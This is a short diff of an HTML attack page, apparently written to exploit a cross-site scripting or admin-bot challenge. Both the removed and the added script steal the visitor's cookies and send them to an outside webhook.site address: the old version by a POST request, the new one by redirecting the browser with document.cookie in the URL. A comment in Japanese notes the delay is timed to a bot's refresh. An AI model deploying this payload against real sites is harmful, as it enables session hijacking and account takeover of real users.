@@ -1,14 +1,10 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>Trying to steal cookies...</h1>
     <script>
       setTimeout(() => {
-        fetch("https://webhook.site/7adaf4b2-1fc1-4f19-8981-a0ec19465e96", {
-          method: "POST",
-          body: document.cookie
-        });
-      }, 500);  // 遅延を入れることでbotのrefreshタイミングに対応
+        location = "https://webhook.site/7adaf4b2-1fc1-4f19-8981-a0ec19465e96?" + document.cookie;
+      }, 500);
     </script>
   </body>
 </html>
